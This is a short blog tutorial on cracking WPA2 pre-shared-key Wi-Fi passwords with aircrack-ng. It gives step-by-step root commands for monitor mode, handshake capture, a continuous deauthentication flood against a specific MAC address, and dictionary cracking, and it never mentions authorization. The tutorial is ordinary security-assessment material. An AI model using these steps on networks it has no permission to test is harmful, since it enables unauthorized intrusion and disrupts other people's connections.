---
title: "Cracking Wpa2"
date: 2023-07-11T12:36:55+02:00
tags: ["pentesting", "linux"]
author: "Andy Sukowski-Bang"
description: "This short tutorial walks you through cracking WPA2 networks which use pre-shared keys using the [aircrack-ng](https://www.aircrack-ng.org) suite of tools to assess WI-FI network security. All of the necessary tools come preinstalled with the [Kali Linux](https://www.kali.org) distribution."
---

This short tutorial walks you through cracking WPA2 networks which use
pre-shared keys using the [aircrack-ng][1] suite of tools to assess WI-FI
network security. All of the necessary tools come preinstalled with the [Kali
Linux][2] distribution. The `#` in front of commands means, that they have to
be executed as the `root` user, e.g. using `sudo`.

## Wireless card into monitor mode

List all possible programs that could interfere with the wireless card. If
`kill` is specified, it will try to kill all of them.

```
# airmon-ng check kill
```

Enable monitor mode on an interface (here it's `wlp3s0`) and check if it worked

```
# airmon-ng start wlp3s0
# airmon-ng
```

## Capture handshake

List Wi-Fi networks and their BSSIDs, Channels, etc.

```
# airodump-ng wlp3s0mon
```

Narrow search down to specific BSSID (MAC address).

```
# airodump-ng wlp3s0mon -d <BSSID>
```

Capture WPA2 handshake and write it to file (e.g. `handshake1-01.cap`). Remember
to change interface name, if needed.

```
# airodump-ng -w handshake -c <channel> --bssid <BSSID> wlp3s0mon
```

**Optional in other terminal:** Simultaniously send deauthentication packets to
clients on the network to capture WPA2 handshake by forcing clients to
reauthenticate. Without this step, it might take some time to capture the
handshake.

```
# aireplay-ng --deauth 0 -a E0:28:6D:F3:B6:5D wlp3s0mon
```

## Crack password

After storing the handshake in e.g. `handshake1-01.cap`, we can finally crack the
password using `aircrack-ng`.

```
# aircrack-ng handshake1-01.cap -w dictionary.txt
```

Alternatively, we can extract the handshake from the `.cap` capture file and
convert it to a modern hashcat compatible hash file using
[hashcat.net/cap2hashcat][3], which can then be cracked using [hashcat][4].

[1]: https://www.aircrack-ng.org
[2]: https://www.kali.org
[3]: https://hashcat.net/cap2hashcat
[4]: https://hashcat.net/hashcat
